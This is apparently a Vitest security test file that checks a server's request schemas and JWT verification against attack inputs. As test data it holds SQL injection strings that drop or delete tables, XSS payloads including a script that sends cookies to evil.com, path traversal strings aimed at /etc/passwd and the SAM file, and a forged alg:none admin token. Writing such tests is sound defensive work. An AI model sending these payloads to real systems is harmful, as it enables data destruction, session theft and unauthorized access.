import { describe, it, expect, vi } from 'vitest';
import { SignJWT } from 'jose';
import {
  ChatRequestSchema,
  AdminApplyPolicySchema,
  PolicyDryRunRequestSchema,
} from '../../src/server/schemas/contracts';

// ============================================================================
// Security Tests - Input Injection
// ============================================================================

describe('Security: Input Injection Prevention', () => {
  describe('SQL Injection attempts', () => {
    const sqlPayloads = [
      "'; DROP TABLE users; --",
      "1 OR 1=1",
      "' UNION SELECT * FROM users --",
      "admin'--",
      "1; DELETE FROM policies WHERE 1=1",
    ];

    it('schema accepts SQL strings (validation/sanitization is at DB layer)', () => {
      for (const payload of sqlPayloads) {
        // Schema should not crash - SQL injection is handled at the query level
        const result = ChatRequestSchema.parse({ message: payload });
        expect(result.message).toBe(payload);
      }
    });

    it('SQL injection in policyId is constrained by length', () => {
      const longInjection = "'; DROP TABLE users; --".repeat(10);
      // Should be rejected by max length
      expect(() =>
        PolicyDryRunRequestSchema.parse({
          policyId: longInjection,
          parameters: {},
        })
      ).toThrow();
    });
  });

  describe('XSS Injection attempts', () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      '<img src=x onerror="alert(1)">',
      '<svg onload="alert(1)">',
      'javascript:alert(1)',
      '<iframe src="data:text/html,<script>alert(1)</script>">',
      '"><script>document.location="http://evil.com/?c="+document.cookie</script>',
    ];

    it('schema accepts XSS strings (render-level sanitization handles these)', () => {
      for (const payload of xssPayloads) {
        const result = ChatRequestSchema.parse({ message: payload });
        expect(result.message).toBe(payload);
      }
    });

    it('XSS in confirmation code is accepted by schema', () => {
      const result = AdminApplyPolicySchema.parse({
        policyId: 'POL-102',
        confirmationCode: '<script>alert("xss")</script>',
        reason: 'Test XSS in confirmation code',
      });
      // The actual validation of confirmationCode === `APPLY-${policyId}` happens in audit middleware
      expect(result.confirmationCode).toContain('<script>');
    });
  });

  describe('Path Traversal attempts', () => {
    const pathPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '%2e%2e%2f%2e%2e%2f',
      '....//....//etc/passwd',
    ];

    it('path traversal in policyId is constrained by length', () => {
      for (const payload of pathPayloads) {
        // Short payloads should parse, long ones should fail length check
        if (payload.length <= 100) {
          expect(() =>
            PolicyDryRunRequestSchema.parse({
              policyId: payload,
              parameters: {},
            })
          ).not.toThrow();
        }
      }
    });
  });

  describe('JSON Injection attempts', () => {
    it('handles deeply nested JSON in parameters', () => {
      let nested: any = { value: 'leaf' };
      for (let i = 0; i < 20; i++) {
        nested = { nested };
      }

      expect(() =>
        PolicyDryRunRequestSchema.parse({
          policyId: 'POL-102',
          parameters: nested,
        })
      ).not.toThrow();
    });

    it('handles prototype pollution attempt in parameters', () => {
      const result = PolicyDryRunRequestSchema.parse({
        policyId: 'POL-102',
        parameters: { '__proto__': { isAdmin: true } },
      });
      // Zod sanitizes the output
      expect(result.parameters).toBeDefined();
    });
  });
});

// ============================================================================
// Security Tests - Authentication Bypass Attempts
// ============================================================================

describe('Security: Authentication Bypass Attempts', () => {
  const JWT_SECRET = new TextEncoder().encode('test-secret');

  it('rejects empty Bearer token', () => {
    const authHeader = 'Bearer ';
    const token = authHeader.split(' ')[1];
    expect(token).toBe('');
  });

  it('rejects malformed JWT (missing parts)', () => {
    const malformedTokens = [
      'not-a-jwt',
      'a.b',         // only 2 parts
      'a.b.c.d',     // 4 parts
      'header.payload', // 2 parts
    ];

    for (const token of malformedTokens) {
      // Attempting to decode the payload should fail or produce garbage
      try {
        const payload = JSON.parse(atob(token.split('.')[1] || ''));
        // Even if parsing succeeds, jose.jwtVerify would reject
      } catch (e) {
        // Expected - malformed base64
      }
    }
  });

  it('detects JWT with tampered payload', async () => {
    // Create a valid token
    const token = await new SignJWT({ role: 'operator', email: 'test@casa.local' })
      .setProtectedHeader({ alg: 'HS256' })
      .setIssuedAt()
      .setExpirationTime('1h')
      .sign(JWT_SECRET);

    // Tamper with the payload (change role to admin)
    const parts = token.split('.');
    const payload = JSON.parse(atob(parts[1]));
    payload.role = 'admin';
    const tamperedPayload = btoa(JSON.stringify(payload)).replace(/=/g, '');
    const tamperedToken = `${parts[0]}.${tamperedPayload}.${parts[2]}`;

    // jwtVerify should reject tampered token
    const { jwtVerify } = await import('jose');
    await expect(jwtVerify(tamperedToken, JWT_SECRET)).rejects.toThrow();
  });

  it('rejects JWT signed with "none" algorithm (alg: none attack)', async () => {
    // Manually construct an unsigned JWT
    const header = btoa(JSON.stringify({ alg: 'none', typ: 'JWT' })).replace(/=/g, '');
    const payload = btoa(
      JSON.stringify({ role: 'admin', email: 'hacker@evil.com', exp: Math.floor(Date.now() / 1000) + 3600 })
    ).replace(/=/g, '');
    const unsignedToken = `${header}.${payload}.`;

    const { jwtVerify } = await import('jose');
    await expect(jwtVerify(unsignedToken, JWT_SECRET)).rejects.toThrow();
  });

  it('rejects JWT with future "iat" (issued-at) tampering', async () => {
    // This should still be valid if exp is in the future
    const token = await new SignJWT({ role: 'operator' })
      .setProtectedHeader({ alg: 'HS256' })
      .setIssuedAt(Math.floor(Date.now() / 1000) + 3600) // 1 hour in the future
      .setExpirationTime(Math.floor(Date.now() / 1000) + 7200)
      .sign(JWT_SECRET);

    const { jwtVerify } = await import('jose');
    // jose allows future iat by default (it only checks exp)
    const result = await jwtVerify(token, JWT_SECRET);
    expect(result.payload).toBeDefined();
  });
});

// ============================================================================
// Security Tests - Role Escalation
// ============================================================================

describe('Security: Role Escalation Prevention', () => {
  it('admin confirmation code must match exactly', () => {
    const policyId = 'POL-102';
    const expectedCode = `APPLY-${policyId}`;

    // These should NOT match
    const invalidCodes = [
      'apply-POL-102',     // wrong case
      'APPLY-POL-103',     // wrong policy
      'APPLY- POL-102',    // extra space
      'APPLY-POL-102 ',    // trailing space
      ' APPLY-POL-102',    // leading space
      'APPLY-pol-102',     // mixed case
    ];

    for (const code of invalidCodes) {
      expect(code).not.toBe(expectedCode);
    }

    expect('APPLY-POL-102').toBe(expectedCode);
  });

  it('admin schema validates all required fields', () => {
    // Missing confirmationCode
    expect(() =>
      AdminApplyPolicySchema.parse({
        policyId: 'POL-102',
        reason: 'test',
      })
    ).toThrow();

    // Missing reason
    expect(() =>
      AdminApplyPolicySchema.parse({
        policyId: 'POL-102',
        confirmationCode: 'APPLY-POL-102',
      })
    ).toThrow();

    // Missing policyId
    expect(() =>
      AdminApplyPolicySchema.parse({
        confirmationCode: 'APPLY-POL-102',
        reason: 'test',
      })
    ).toThrow();
  });
});

// ============================================================================
// Security Tests - Header Injection
// ============================================================================

describe('Security: Header Injection Prevention', () => {
  it('correlation ID format is a valid UUID', () => {
    const crypto = require('crypto');
    const uuid = crypto.randomUUID();
    const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
    expect(uuid).toMatch(uuidRegex);
  });
});
